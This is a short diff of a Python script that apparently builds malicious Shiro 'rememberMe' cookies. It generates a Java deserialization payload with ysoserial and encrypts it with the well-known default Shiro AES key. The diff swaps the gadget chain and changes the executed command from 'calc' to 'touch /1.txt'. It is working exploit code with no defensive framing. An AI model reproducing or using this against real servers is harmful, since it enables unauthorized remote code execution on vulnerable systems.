@@ -13,7 +13,7 @@ jar_file = 'F:\\Penetration\\ysoserial\\ysoserial-0.0.6-SNAPSHOT-all.jar'
 cipher_key = "kPH+bIxk5D2deZiIxcaaaA=="
 
 # 创建 rememberme的值
-popen = subprocess.Popen(['java','-jar',jar_file, "CommonsCollections2", "calc"],
+popen = subprocess.Popen(['java','-jar',jar_file, "CommonsCollections1",  "touch /1.txt"],
                         stdout=subprocess.PIPE)
 BS = AES.block_size
 pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
